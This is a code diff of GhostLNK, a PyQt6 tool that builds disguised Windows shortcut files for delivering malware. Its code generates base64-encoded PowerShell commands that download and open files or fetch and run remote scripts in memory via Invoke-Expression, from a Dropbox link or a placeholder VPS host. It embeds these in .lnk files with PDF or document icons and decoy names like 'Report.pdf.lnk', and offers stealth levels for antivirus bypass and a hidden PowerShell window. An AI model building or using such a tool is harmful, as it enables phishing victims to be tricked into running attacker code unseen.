@@ -19,8 +19,8 @@ from pathlib import Path
 
 # Try to import required libraries
 try:
-    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
-                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
+    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
+                                 QHBoxLayout, QLabel, QLineEdit, QPushButton,
                                  QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                  QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                  QTabWidget, QListWidget, QListWidgetItem, QMenu,
@@ -31,8 +31,8 @@ try:
 except ImportError:
     print("[-] PyQt6 not installed. Installing...")
     os.system("pip install PyQt6")
-    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
-                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
+    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
+                                 QHBoxLayout, QLabel, QLineEdit, QPushButton,
                                  QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                  QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                  QTabWidget, QListWidget, QListWidgetItem, QMenu,
@@ -53,11 +53,11 @@ CONFIG_FILE = "ghostlnk_config.json"
 
 class URLExamples:
     """Collection of URL examples for different scenarios"""
-    
+
     # Generic Dropbox example (not real)
     DROPBOX_EXAMPLE = "https://www.dropbox.com/scl/fi/6z4obwg71nm7wu5plfvtr/doc.pdf?rlkey=rl63zpok5szx3ruly7pfmltqn&st=17b8n5wl&dl=1"
     DROPBOX_PS1_EXAMPLE = "https://www.dropbox.com/scl/fi/abc123/script.ps1?rlkey=xyz&dl=1"
-    
+
     @staticmethod
     def get_all_examples():
         return {
@@ -86,7 +86,7 @@ class URLExamples:
 
 class PowerShellConverter:
     """Convert URLs to PowerShell -E format with stealth options"""
-    
+
     @staticmethod
     def create_download_and_open_payload(url, pause=True, debug=False, stealth_level=0):
         """
@@ -104,7 +104,7 @@ $f=[IO.Path]::Combine($t,"doc.pdf");
 Start "$f";
 '''
             return ps_command.strip()
-        
+
         elif stealth_level == 1:
             # MODERATE STEALTH - Uses aliases, avoids suspicious patterns
             ps_command = f'''
@@ -115,7 +115,7 @@ $file = Join-Path $temp "doc.pdf"
 Start-Process $file
 '''
             return ps_command.strip()
-        
+
         elif debug:
             # Debug version with verbose output
             pause_cmd = """
@@ -123,7 +123,7 @@ Write-Host "";
 Write-Host "Press any key to exit this window..." -ForegroundColor White;
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
 """ if pause else ""
-            
+
             ps_command = f'''
 # GhostLNK - Download & Open Mode (DEBUG)
 Write-Host "========================================" -ForegroundColor Cyan;
@@ -174,10 +174,10 @@ try {{
     Write-Host "[+] Downloading file..." -ForegroundColor Yellow;
     $wc = New-Object System.Net.WebClient;
     $wc.DownloadFile("{url}", $tempFile);
-    
+
     $fileSize = (Get-Item $tempFile).Length;
     Write-Host "[✓] Download complete! Size: $fileSize bytes" -ForegroundColor Green;
-    
+
     Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow;
     Invoke-Item $tempFile;
     Write-Host "[✓] File opened successfully!" -ForegroundColor Green;
@@ -201,7 +201,7 @@ Write-Host "";
 Write-Host "Press any key to exit this window..." -ForegroundColor White;
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
 """ if pause else ""
-            
+
             ps_command = f'''
 # GhostLNK - Download & Open
 Write-Host "[+] Downloading file..." -ForegroundColor Green;
@@ -215,7 +215,7 @@ Write-Host "[✓] Done!" -ForegroundColor Green;
 {pause_cmd}
 '''
         return ps_command.strip()
-    
+
     @staticmethod
     def create_memory_execute_payload(url, pause=True, debug=False, stealth_level=0):
         """
@@ -233,7 +233,7 @@ Write-Host "";
 Write-Host "Press any key to exit this window..." -ForegroundColor White;
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
 """ if pause else ""
-            
+
             ps_command = f'''
 # GhostLNK - Memory Execute Mode (DEBUG)
 Write-Host "========================================" -ForegroundColor Cyan;
@@ -298,7 +298,7 @@ Write-Host "";
 Write-Host "Press any key to exit this window..." -ForegroundColor White;
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
 """ if pause else ""
-            
+
             ps_command = f'''
 # GhostLNK - Memory Execute
 Write-Host "[+] Executing script..." -ForegroundColor Green;
@@ -307,7 +307,7 @@ Write-Host "[✓] Done!" -ForegroundColor Green;
 {pause_cmd}
 '''
         return ps_command.strip()
-    
+
     @staticmethod
     def create_stealth_payload(url, pause=False, debug=False, stealth_level=0):
         """
@@ -323,7 +323,7 @@ Write-Host "";
 Write-Host "Press any key to exit this window..." -ForegroundColor White;
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
 """ if pause else ""
-            
+
             ps_command = f'''
 # GhostLNK - Stealth Mode
 Invoke-Expression (wget -useb "{url}");
@@ -336,14 +336,14 @@ Write-Host "";
 Write-Host "Press any key to exit this window..." -ForegroundColor White;
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown");
 """ if pause else ""
-            
+
             ps_command = f'''
 # GhostLNK - Stealth Mode
 Invoke-Expression (wget -useb "{url}");
 {pause_cmd}
 '''
             return ps_command.strip()
-    
+
     @staticmethod
     def validate_dropbox_url(url):
         """Check if Dropbox URL has correct parameters"""
@@ -352,7 +352,7 @@ Invoke-Expression (wget -useb "{url}");
                 return False, "Dropbox URL missing 'dl=1' parameter. Add '&dl=1' or '?dl=1' to the end."
             return True, "Valid Dropbox URL"
         return True, "Not a Dropbox URL"
-    
+
     @staticmethod
     def guess_payload_type(url):
         """Guess the best payload type based on URL"""
@@ -367,12 +367,12 @@ Invoke-Expression (wget -useb "{url}");
 
 class LNKEngine:
     """Core LNK generation engine with stealth options"""
-    
+
     # Window mode constants for pylnk3
     WINDOW_NORMAL = 'Normal'
     WINDOW_MAXIMIZED = 'Maximized'
     WINDOW_MINIMIZED = 'Minimized'
-    
+
     @staticmethod
     def create_lnk(output_filename, target_path, arguments, icon_path, icon_index, description, working_dir=None, stealth_level=0, hide_powershell=False):
         """Create a Windows LNK file with stealth options"""
@@ -381,20 +381,20 @@ class LNKEngine:
         target_file = target_split[-1]
         target_drive = target_split[0]
         target_directory = working_dir or '\\'.join(target_split[:-1])
-        
+
         # Create LNK object
         lnk = pylnk3.create(output_filename)
-        
+
         # Set basic information
         lnk.specify_local_location(target_path)
-        
+
         # Configure link info
         lnk._link_info.size_local_volume_table = 0
         lnk._link_info.volume_label = ""
         lnk._link_info.drive_serial = 0
         lnk._link_info.local = True
         lnk._link_info.local_base_path = target_path
-        
+
         # Handle PowerShell hidden window option
         if hide_powershell and arguments.startswith('-E '):
             # Add -WindowStyle Hidden but keep existing arguments
@@ -419,67 +419,67 @@ class LNKEngine:
             else:
                 # Normal mode
                 lnk.window_mode = LNKEngine.WINDOW_NORMAL
-        
+
         if arguments:
             lnk.arguments = arguments
-            
+
         # Set icon
         lnk.icon = icon_path
         lnk.icon_index = icon_index
-            
+
         # Set working directory
         lnk.working_dir = target_directory
-        
+
         # Set description
         if description:
             lnk.description = description
-            
+
         # Build the shell item ID list
         def build_entry(name, is_dir):
             entry = pylnk3.PathSegmentEntry()
             entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
             entry.file_size = 0
-            
+
             n = datetime.now()
             entry.modified = n
             entry.created = n
             entry.accessed = n
-            
+
             entry.short_name = name
             entry.full_name = name
-            
+
             return entry
-        
+
         # Create the path hierarchy
         elements = [
             pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
             pylnk3.DriveEntry(target_drive)
         ]
-        
+
         # Add each directory in the path
         for level in target_split[1:-1]:
             if level:
                 entry = build_entry(level, is_dir=True)
                 elements.append(entry)
-        
+
         # Add the target file
         entry = build_entry(target_file, is_dir=False)
         elements.append(entry)
-        
+
         # Set the shell item ID list
         lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
         lnk.shell_item_id_list.items = elements
-        
+
         # Write the LNK file
         with open(output_filename, 'wb') as f:
             lnk.write(f)
-        
+
         return True
 
 
 class GhostLNKGUI(QMainWindow):
     """Main GUI Window - GhostLNK"""
-    
+
     # Icon database
     ICON_DATABASE = {
         "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
@@ -491,14 +491,14 @@ class GhostLNKGUI(QMainWindow):
         "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
         "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
     }
-    
+
     def __init__(self):
         super().__init__()
         self.recent_urls = []
         self.recent_conversions = []
         self.load_config()
         self.init_ui()
-        
+
     def load_config(self):
         """Load configuration from file"""
         if os.path.exists(CONFIG_FILE):
@@ -510,7 +510,7 @@ class GhostLNKGUI(QMainWindow):
             except:
                 self.recent_urls = []
                 self.recent_conversions = []
-    
+
     def save_config(self):
         """Save configuration to file"""
         config = {
@@ -519,18 +519,18 @@ class GhostLNKGUI(QMainWindow):
         }
         with open(CONFIG_FILE, 'w') as f:
             json.dump(config, f)
-    
+
     def init_ui(self):
         """Initialize the user interface"""
         self.setWindowTitle("👻 GhostLNK v6.2 - Created by github.com/Excalibra")
-        
+
         # Get screen geometry
         screen = QApplication.primaryScreen().availableGeometry()
         window_width = int(screen.width() * 0.9)
         window_height = int(screen.height() * 0.85)
         self.setGeometry(50, 50, window_width, window_height)
         self.setMinimumSize(1200, 700)
-        
+
         # Set dark theme
         self.setStyleSheet("""
             QMainWindow { background-color: #1a1a2e; }
@@ -568,54 +568,54 @@ class GhostLNKGUI(QMainWindow):
             }
             QRadioButton, QCheckBox { color: #e0e0e0; font-size: 11px; }
         """)
-        
+
         # Central widget
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         main_layout = QVBoxLayout(central_widget)
         main_layout.setSpacing(5)
         main_layout.setContentsMargins(8, 8, 8, 8)
-        
+
         # Title with credit
         title = QLabel("👻 GhostLNK 👻")
         title.setAlignment(Qt.AlignmentFlag.AlignCenter)
         title.setStyleSheet("color: #a8a8ff; font-size: 18px; font-weight: bold; padding: 5px;")
         main_layout.addWidget(title)
-        
+
         # Credit line
         credit = QLabel("Created by: github.com/Excalibra")
         credit.setAlignment(Qt.AlignmentFlag.AlignCenter)
         credit.setStyleSheet("color: #88ff88; font-size: 12px; font-weight: bold; padding-bottom: 2px;")
         main_layout.addWidget(credit)
-        
+
         # Subtitle
         subtitle = QLabel("📌 Dropbox: &dl=1 | STEALTH: Avoids suspicious patterns | HIDE: -WindowStyle Hidden option added")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
         subtitle.setStyleSheet("color: #ffaa00; font-size: 11px; padding-bottom: 5px;")
         main_layout.addWidget(subtitle)
-        
+
         # Main splitter
         splitter = QSplitter(Qt.Orientation.Horizontal)
         main_layout.addWidget(splitter)
-        
+
         # Left panel
         left_scroll = QScrollArea()
         left_scroll.setWidgetResizable(True)
         left_scroll.setWidget(self.create_converter_panel())
         splitter.addWidget(left_scroll)
-        
+
         # Right panel
         right_scroll = QScrollArea()
         right_scroll.setWidgetResizable(True)
         right_scroll.setWidget(self.create_lnk_panel())
         splitter.addWidget(right_scroll)
-        
+
         splitter.setSizes([int(window_width * 0.45), int(window_width * 0.45)])
-        
+
         # Console
         console_group = QGroupBox("👻 Console Output")
         console_layout = QVBoxLayout()
-        
+
         toolbar = QHBoxLayout()
         clear_btn = QPushButton("Clear Console")
         clear_btn.setMaximumWidth(100)
@@ -623,7 +623,7 @@ class GhostLNKGUI(QMainWindow):
         toolbar.addWidget(clear_btn)
         toolbar.addStretch()
         console_layout.addLayout(toolbar)
-        
+
         self.console = QTextEdit()
         self.console.setReadOnly(True)
         self.console.setMaximumHeight(120)
@@ -631,65 +631,65 @@ class GhostLNKGUI(QMainWindow):
         console_layout.addWidget(self.console)
         console_group.setLayout(console_layout)
         main_layout.addWidget(console_group)
-        
+
         # Status bar with credit
         self.statusBar().showMessage("👻 Created by github.com/Excalibra")
         self.statusBar().setStyleSheet("color: #a8a8ff;")
-        
+
         self.create_menu()
         self.log("👻 GhostLNK v6.2 initialized - Created by github.com/Excalibra")
         self.log("[✓] Hidden PowerShell Window option added")
         self.log("[✓] Multiple stealth levels available")
-    
+
     def create_converter_panel(self):
         """Create the converter panel"""
         panel = QWidget()
         layout = QVBoxLayout(panel)
         layout.setSpacing(6)
-        
+
         # URL Input
         url_group = QGroupBox("Step 1: Enter URL")
         url_layout = QVBoxLayout()
-        
+
         self.url_input = QLineEdit()
         self.url_input.setPlaceholderText("https://www.dropbox.com/scl/fi/.../file.pdf?dl=1")
         self.url_input.textChanged.connect(self.on_url_changed)
         url_layout.addWidget(self.url_input)
-        
+
         self.dropbox_indicator = QLabel("")
         self.dropbox_indicator.setStyleSheet("color: #ffaa00; font-size: 9px;")
         url_layout.addWidget(self.dropbox_indicator)
-        
+
         url_group.setLayout(url_layout)
         layout.addWidget(url_group)
-        
+
         # Quick Examples
         examples_group = QGroupBox("Quick Examples")
         examples_layout = QGridLayout()
-        
+
         btn1 = QPushButton("📄 PDF Example")
         btn1.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_EXAMPLE))
         examples_layout.addWidget(btn1, 0, 0)
-        
+
         btn2 = QPushButton("⚡ PowerShell Example")
         btn2.clicked.connect(lambda: self.load_url(URLExamples.DROPBOX_PS1_EXAMPLE))
         examples_layout.addWidget(btn2, 0, 1)
-        
+
         btn3 = QPushButton("🖥️ Your VPS - File")
         btn3.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/file.pdf"))
         examples_layout.addWidget(btn3, 1, 0)
-        
+
         btn4 = QPushButton("🖥️ Your VPS - Script")
         btn4.clicked.connect(lambda: self.load_url("http://YOUR-VPS:8000/script.ps1"))
         examples_layout.addWidget(btn4, 1, 1)
-        
+
         examples_group.setLayout(examples_layout)
         layout.addWidget(examples_group)
-        
+
         # Payload Type Selection
         type_group = QGroupBox("Step 2: Select Payload Type")
         type_layout = QVBoxLayout()
-        
+
         self.type_combo = QComboBox()
         self.type_combo.addItems([
             "📁 Download & Open (For PDFs, images, documents)",
@@ -698,19 +698,19 @@ class GhostLNKGUI(QMainWindow):
         ])
         self.type_combo.currentIndexChanged.connect(self.on_type_changed)
         type_layout.addWidget(self.type_combo)
-        
+
         self.type_hint = QLabel("Selected: For PDFs and documents - saves to temp and opens")
         self.type_hint.setWordWrap(True)
         self.type_hint.setStyleSheet("color: #8888aa; font-size: 9px; padding: 2px;")
         type_layout.addWidget(self.type_hint)
-        
+
         type_group.setLayout(type_layout)
         layout.addWidget(type_group)
-        
+
         # Stealth Options
         stealth_group = QGroupBox("Step 3: Stealth Level")
         stealth_layout = QVBoxLayout()
-        
+
         self.stealth_combo = QComboBox()
         self.stealth_combo.addItems([
             "0 - Normal (Visible output)",
@@ -719,313 +719,318 @@ class GhostLNKGUI(QMainWindow):
         ])
         self.stealth_combo.currentIndexChanged.connect(self.on_stealth_changed)
         stealth_layout.addWidget(self.stealth_combo)
-        
+
         self.stealth_hint = QLabel("Maximum Stealth: Uses aliases, avoids -WindowStyle Hidden, minimal code")
         self.stealth_hint.setWordWrap(True)
         self.stealth_hint.setStyleSheet("color: #88ff88; font-size: 9px; padding: 2px;")
         stealth_layout.addWidget(self.stealth_hint)
-        
+
         stealth_group.setLayout(stealth_layout)
         layout.addWidget(stealth_group)
-        
+
         # Options (Pause, Debug, Hide PowerShell)
         options_group = QGroupBox("Step 4: Execution Options")
         options_layout = QVBoxLayout()
-        
+
         # Pause checkbox
         self.pause_cb = QCheckBox("⏸️ Pause after execution (Window stays open)")
         self.pause_cb.setChecked(False)
         self.pause_cb.toggled.connect(self.update_options)
         options_layout.addWidget(self.pause_cb)
-        
+
         # Debug checkbox (disabled when stealth > 0)
         self.debug_cb = QCheckBox("🐛 Enable Debug Mode (Verbose output)")
         self.debug_cb.setChecked(False)
         self.debug_cb.toggled.connect(self.update_options)
         options_layout.addWidget(self.debug_cb)
-        
+
         # Hidden PowerShell Window checkbox (NEW)
         self.hide_pwsh_cb = QCheckBox("🔒 Hide PowerShell Window (-WindowStyle Hidden)")
         self.hide_pwsh_cb.setChecked(False)
         self.hide_pwsh_cb.toggled.connect(self.update_options)
         options_layout.addWidget(self.hide_pwsh_cb)
-        
+
         options_group.setLayout(options_layout)
         layout.addWidget(options_group)
-        
+
         # Generate Buttons
         gen_group = QGroupBox("Step 5: Generate (Click in Order: 1 → 2 → 3 → 🚀)")
         gen_group.setStyleSheet("QGroupBox { font-weight: bold; color: #ffaa00; }")
         gen_layout = QVBoxLayout()
-        
+
         # Visual order indicator
         order_label = QLabel("⚠️ MUST CLICK IN THIS ORDER: 1 → 2 → 3 → 🚀")
         order_label.setStyleSheet("color: #ff8888; font-weight: bold; font-size: 10px; padding: 2px;")
         order_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
         gen_layout.addWidget(order_label)
-        
+
         btn_row1 = QHBoxLayout()
-        
+
         self.show_btn = QPushButton("1️ Show Command (Step 1)")
         self.show_btn.setStyleSheet("background-color: #0f3460; font-weight: bold;")
         self.show_btn.clicked.connect(self.show_command)
         btn_row1.addWidget(self.show_btn)
-        
+
         self.encode_btn = QPushButton("2️ Encode to Base64 (Step 2)")
         self.encode_btn.setStyleSheet("background-color: #d35400; font-weight: bold;")
         self.encode_btn.clicked.connect(self.encode)
         btn_row1.addWidget(self.encode_btn)
-        
+
         gen_layout.addLayout(btn_row1)
-        
+
         btn_row2 = QHBoxLayout()
-        
+
         self.copy_btn = QPushButton("3️ Copy -E Argument (Step 3)")
         self.copy_btn.setStyleSheet("background-color: #27ae60; font-weight: bold;")
         self.copy_btn.clicked.connect(self.copy_arg)
         btn_row2.addWidget(self.copy_btn)
-        
+
         self.use_btn = QPushButton("🚀 Use in LNK Generator (Step 4)")
         self.use_btn.setStyleSheet("background-color: #8e44ad; font-weight: bold; color: white;")
         self.use_btn.clicked.connect(self.use_in_lnk)
         btn_row2.addWidget(self.use_btn)
-        
+
         gen_layout.addLayout(btn_row2)
-        
+
         # Add a visual progress indicator
         progress_frame = QFrame()
         progress_frame.setFrameStyle(QFrame.Shape.Box)
         progress_frame.setStyleSheet("background-color: #16213e; padding: 5px;")
         progress_layout = QHBoxLayout(progress_frame)
-        
+
         progress_layout.addWidget(QLabel("Progress:"))
         self.step1_indicator = QLabel("⚪ Step 1")
         self.step1_indicator.setStyleSheet("color: #666666;")
         progress_layout.addWidget(self.step1_indicator)
-        
+
         progress_layout.addWidget(QLabel("→"))
-        
+
         self.step2_indicator = QLabel("⚪ Step 2")
         self.step2_indicator.setStyleSheet("color: #666666;")
         progress_layout.addWidget(self.step2_indicator)
-        
+
         progress_layout.addWidget(QLabel("→"))
-        
+
         self.step3_indicator = QLabel("⚪ Step 3")
         self.step3_indicator.setStyleSheet("color: #666666;")
         progress_layout.addWidget(self.step3_indicator)
-        
+
         progress_layout.addWidget(QLabel("→"))
-        
+
         self.step4_indicator = QLabel("⚪ Step 4")
         self.step4_indicator.setStyleSheet("color: #666666;")
         progress_layout.addWidget(self.step4_indicator)
-        
+
         progress_layout.addStretch()
         gen_layout.addWidget(progress_frame)
-        
+
         gen_group.setLayout(gen_layout)
         layout.addWidget(gen_group)
-        
+
         # Results
         results_group = QGroupBox("Results")
         results_layout = QVBoxLayout()
-        
+
         self.cmd_display = QTextEdit()
         self.cmd_display.setMaximumHeight(50)
         results_layout.addWidget(QLabel("PowerShell Command:"))
         results_layout.addWidget(self.cmd_display)
-        
+
         self.arg_display = QTextEdit()
         self.arg_display.setMaximumHeight(40)
         self.arg_display.setStyleSheet("color: #ff8888;")
         results_layout.addWidget(QLabel("Final -E Argument (copy this):"))
         results_layout.addWidget(self.arg_display)
-        
+
         results_group.setLayout(results_layout)
         layout.addWidget(results_group)
-        
+
         # Recent
         recent_group = QGroupBox("Recent")
         recent_layout = QVBoxLayout()
-        
+
         self.recent_list = QListWidget()
         self.recent_list.setMaximumHeight(60)
         recent_layout.addWidget(self.recent_list)
-        
+
         recent_group.setLayout(recent_layout)
         layout.addWidget(recent_group)
-        
+
         layout.addStretch()
         return panel
-    
+
     def create_lnk_panel(self):
         """Create the LNK generator panel"""
         panel = QWidget()
         layout = QVBoxLayout(panel)
         layout.setSpacing(6)
-        
-        # Import
+
+        # Import -E Argument (with hint)
         import_group = QGroupBox("Import -E Argument")
-        import_layout = QHBoxLayout()
-        
+        import_layout = QVBoxLayout()  # Changed to vertical layout
+        input_row = QHBoxLayout()
         self.import_input = QLineEdit()
         self.import_input.setPlaceholderText("Paste -E argument here...")
-        import_layout.addWidget(self.import_input)
-        
+        input_row.addWidget(self.import_input)
         import_btn = QPushButton("Import")
         import_btn.setMaximumWidth(60)
         import_btn.clicked.connect(self.import_arg)
-        import_layout.addWidget(import_btn)
-        
+        input_row.addWidget(import_btn)
+        import_layout.addLayout(input_row)
+
+        # Hint label
+        import_hint = QLabel("ℹ️ After pasting a base64 string, click Import. -E will be added automatically if missing.")
+        import_hint.setWordWrap(True)
+        import_hint.setStyleSheet("color: #aaaaaa; font-size: 9px;")
+        import_layout.addWidget(import_hint)
         import_group.setLayout(import_layout)
         layout.addWidget(import_group)
-        
+
         # Preview
         preview_group = QGroupBox("Payload Preview")
         preview_layout = QVBoxLayout()
         preview_layout.addWidget(QLabel("Target: C:\\Windows\\System32\\...\\powershell.exe"))
-        
+
         self.preview_label = QLabel("Arguments: (not set)")
         self.preview_label.setWordWrap(True)
         self.preview_label.setStyleSheet("color: #ffaa00; background-color: #16213e; padding: 3px;")
         preview_layout.addWidget(self.preview_label)
-        
+
         preview_group.setLayout(preview_layout)
         layout.addWidget(preview_group)
-        
+
         # Icon
         icon_group = QGroupBox("Icon Selection")
         icon_layout = QVBoxLayout()
-        
+
         self.icon_combo = QComboBox()
         self.icon_combo.addItems(list(self.ICON_DATABASE.keys()))
         self.icon_combo.setCurrentText("PDF Document")
         icon_layout.addWidget(self.icon_combo)
-        
+
         icon_group.setLayout(icon_layout)
         layout.addWidget(icon_group)
-        
+
         # Filename
         file_group = QGroupBox("Output Filename")
         file_layout = QGridLayout()
-        
+
         file_layout.addWidget(QLabel("Base name:"), 0, 0)
         self.filename_input = QLineEdit("Report")
         file_layout.addWidget(self.filename_input, 0, 1)
-        
+
         file_layout.addWidget(QLabel("Extension:"), 1, 0)
         self.ext_combo = QComboBox()
         self.ext_combo.addItems([".pdf", ".doc", ".xls", ".txt", ".ps1"])
         file_layout.addWidget(self.ext_combo, 1, 1)
-        
+
         self.lnk_cb = QCheckBox("Add .lnk extension")
         self.lnk_cb.setChecked(True)
         file_layout.addWidget(self.lnk_cb, 2, 1)
-        
+
         file_group.setLayout(file_layout)
         layout.addWidget(file_group)
-        
+
         # Description
         desc_group = QGroupBox("File Description")
         desc_layout = QVBoxLayout()
-        
+
         self.desc_input = QTextEdit()
         self.desc_input.setMaximumHeight(50)
         desc_layout.addWidget(self.desc_input)
-        
+
         gen_desc_btn = QPushButton("Generate Description")
         gen_desc_btn.setMaximumWidth(120)
         gen_desc_btn.clicked.connect(self.generate_desc)
         desc_layout.addWidget(gen_desc_btn)
-        
+
         desc_group.setLayout(desc_layout)
         layout.addWidget(desc_group)
-        
+
         # Mode indicator
         self.mode_indicator = QLabel("Current Mode: Download & Open")
         self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
         layout.addWidget(self.mode_indicator)
-        
+
         # Stealth indicator
         self.stealth_indicator = QLabel("Stealth: Maximum (AV Bypass)")
         self.stealth_indicator.setStyleSheet("color: #88ff88;")
         layout.addWidget(self.stealth_indicator)
-        
+
         # PowerShell Hide indicator (NEW)
         self.hide_indicator = QLabel("PowerShell Window: Visible")
         self.hide_indicator.setStyleSheet("color: #ffaa00;")
         layout.addWidget(self.hide_indicator)
-        
+
         # Generate button
         generate_btn = QPushButton("👻 GENERATE LNK FILE 👻")
         generate_btn.setMinimumHeight(45)
         generate_btn.setStyleSheet("background-color: #6a1f7a; font-size: 14px; font-weight: bold;")
         generate_btn.clicked.connect(self.generate_lnk)
         layout.addWidget(generate_btn)
-        
+
         layout.addStretch()
         return panel
-    
+
     def create_menu(self):
         menubar = self.menuBar()
         menubar.setStyleSheet("color: #e0e0e0; background-color: #16213e;")
-        
+
         help_menu = menubar.addMenu("Help")
-        
+
         about = QAction("About GhostLNK", self)
         about.triggered.connect(self.show_about)
         help_menu.addAction(about)
-        
+
         mode_help = QAction("Mode Guide", self)
         mode_help.triggered.connect(self.show_mode_guide)
         help_menu.addAction(mode_help)
-        
+
         stealth_help = QAction("Stealth Mode Guide", self)
         stealth_help.triggered.connect(self.show_stealth_help)
         help_menu.addAction(stealth_help)
-        
+
         hide_help = QAction("Hidden PowerShell Guide", self)
         hide_help.triggered.connect(self.show_hide_help)
         help_menu.addAction(hide_help)
-    
+
     def update_options(self):
         """Update available options based on selections with visual indicators"""
         stealth = self.stealth_combo.currentIndex()
         hide_pwsh = self.hide_pwsh_cb.isChecked()
-        
+
         # RESET EVERYTHING TO DEFAULT FIRST
         # Enable all checkboxes
         self.pause_cb.setEnabled(True)
         self.debug_cb.setEnabled(True)
         self.hide_pwsh_cb.setEnabled(True)
-        
+
         # Clear ALL styles completely
         self.pause_cb.setStyleSheet("")
         self.debug_cb.setStyleSheet("")
         self.hide_pwsh_cb.setStyleSheet("")
-        
+
         # Force repaint on ALL checkboxes to clear cached styles
         for cb in [self.pause_cb, self.debug_cb, self.hide_pwsh_cb]:
             cb.style().unpolish(cb)
             cb.style().polish(cb)
             cb.update()
-        
+
         # Reset hide indicator to default
         self.hide_indicator.setText("PowerShell Window: Visible")
         self.hide_indicator.setStyleSheet("color: #ffaa00;")
-        
+
         # Reset mode indicator
         mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
         current_mode = mode_names[self.type_combo.currentIndex()]
         self.mode_indicator.setText(f"Current Mode: {current_mode}")
         self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
-        
+
         # Track conflicts for tooltips
         conflicts = []
-        
+
         # APPLY RULES BASED ON CURRENT STATE
-        
+
         # CASE 1: Hide PowerShell is checked
         if hide_pwsh:
             # Disable pause
@@ -1033,47 +1038,47 @@ class GhostLNKGUI(QMainWindow):
             self.pause_cb.setChecked(False)
             self.pause_cb.setStyleSheet("color: #666666;")
             conflicts.append("Pause disabled: Conflicts with hidden window")
-            
+
             # Disable debug
             self.debug_cb.setEnabled(False)
             self.debug_cb.setChecked(False)
             self.debug_cb.setStyleSheet("color: #666666;")
             conflicts.append("Debug disabled: Debug output would be invisible")
-            
+
             # Highlight Hide PowerShell in green
             self.hide_pwsh_cb.setStyleSheet("color: #88ff88; font-weight: bold;")
             self.hide_indicator.setText("PowerShell Window: HIDDEN")
             self.hide_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
-            
+
             # Force repaint for affected checkboxes
             for cb in [self.pause_cb, self.debug_cb, self.hide_pwsh_cb]:
                 cb.style().unpolish(cb)
                 cb.style().polish(cb)
                 cb.update()
-            
+
             # Update mode indicator with conflicts
             self.mode_indicator.setText(f"Current Mode: {current_mode} (no pause, no debug)")
             self.mode_indicator.setStyleSheet("color: #ffaa00; font-weight: bold;")
-            
+
             # Set tooltips
             self.pause_cb.setToolTip(self.get_tooltip("pause", conflicts))
             self.debug_cb.setToolTip(self.get_tooltip("debug", conflicts))
             self.hide_pwsh_cb.setToolTip(self.get_tooltip("hide", conflicts))
             return
-        
+
         # CASE 2: Stealth-based rules (only when hide_pwsh is False)
         # All stealth levels: ALL options should be available
         # No options are disabled based on stealth level alone
-        
+
         # Update mode indicator with conflicts (none in stealth modes)
         self.mode_indicator.setText(f"Current Mode: {current_mode}")
         self.mode_indicator.setStyleSheet("color: #88ff88; font-weight: bold;")
-        
+
         # Set tooltips (no conflicts)
         self.pause_cb.setToolTip(self.get_tooltip("pause", conflicts))
         self.debug_cb.setToolTip(self.get_tooltip("debug", conflicts))
         self.hide_pwsh_cb.setToolTip(self.get_tooltip("hide", conflicts))
-    
+
     def get_tooltip(self, option, conflicts):
         """Generate tooltip text based on option and conflicts"""
         base_tooltips = {
@@ -1081,15 +1086,15 @@ class GhostLNKGUI(QMainWindow):
             "debug": "🐛 Debug Mode - shows detailed verbose output",
             "hide": "🔒 Hide PowerShell Window - runs completely invisibly (may trigger AV)"
         }
-        
+
         tooltip = base_tooltips.get(option, "")
-        
+
         # Add conflict explanations
-        relevant_conflicts = [c for c in conflicts if option in c.lower() or 
+        relevant_conflicts = [c for c in conflicts if option in c.lower() or
                               (option == "pause" and "pause" in c.lower()) or
                               (option == "debug" and "debug" in c.lower()) or
                               (option == "hide" and "hide" in c.lower())]
-        
+
         if relevant_conflicts:
             tooltip += "\n\n❌ DISABLED:\n" + "\n".join(relevant_conflicts)
         else:
@@ -1101,9 +1106,9 @@ class GhostLNKGUI(QMainWindow):
             }
             if option in cb_map and not cb_map[option].isEnabled():
                 tooltip += "\n\n⚠️ Currently disabled"
-        
+
         return tooltip
-    
+
     def update_indicators(self):
         """Update all status indicators"""
         # Update hide indicator
@@ -1116,11 +1121,11 @@ class GhostLNKGUI(QMainWindow):
         else:
             self.hide_indicator.setText("PowerShell Window: Visible")
             self.hide_indicator.setStyleSheet("color: #ffaa00;")
-        
+
         # Update mode indicator with conflict info
         mode_names = ["Download & Open", "Memory Execute", "Ultra Stealth"]
         current_mode = mode_names[self.type_combo.currentIndex()]
-        
+
         conflicts = []
         if not self.pause_cb.isEnabled():
             conflicts.append("no pause")
@@ -1128,14 +1133,14 @@ class GhostLNKGUI(QMainWindow):
